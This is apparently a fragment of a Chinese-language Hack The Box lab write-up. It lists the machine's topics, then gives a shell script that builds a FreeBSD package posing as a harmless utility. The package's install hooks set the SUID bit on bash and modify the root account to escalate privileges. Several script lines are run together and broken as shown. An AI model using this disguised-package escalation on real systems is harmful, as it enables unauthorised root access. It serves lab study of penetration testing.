背景介绍


Hack The Box 是国外的一个靶机平台，里面的靶机包含多种系统类型，并且里面可以利用的漏洞类型多种多样，有很多靶机其实非常贴近实战情景。因此 HTB 是一个很好的学习渗透测试靶场。本次靶机主要涉及知识点为：目录扫描、子域名扫描、xss、CVE-2020-14321、msyql命令、提权等，难度中等偏上。

#!/bin/sh
STAGEDIR=~/stagerm -rf ${STAGEDIR}mkdir -p ${STAGEDIR}cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
system("/bin/bash")
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF

echo "Registering root shell"chmod +s /usr/local/bin/bashpw usermod -n root -s /bin/bash
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackageversion: "1.0_5"origin: sysutils/mypackagecomment: "automates stuff"desc: "automates tasks which can also be undone later"maintainer: john@doe.itwww: https://doe.itprefix: /
EOF
